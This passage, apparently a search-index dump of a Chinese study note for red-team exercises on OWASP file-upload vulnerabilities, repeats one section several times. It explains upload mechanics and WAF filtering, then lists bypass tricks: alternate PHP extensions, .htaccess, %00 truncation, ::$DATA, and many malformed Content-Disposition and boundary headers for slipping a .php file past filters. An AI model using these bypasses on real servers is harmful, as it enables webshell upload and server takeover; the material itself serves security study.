、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#大小写变换"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#添加换行符"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#多个分号"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#多个等号"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#变换content-disposition的值"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" 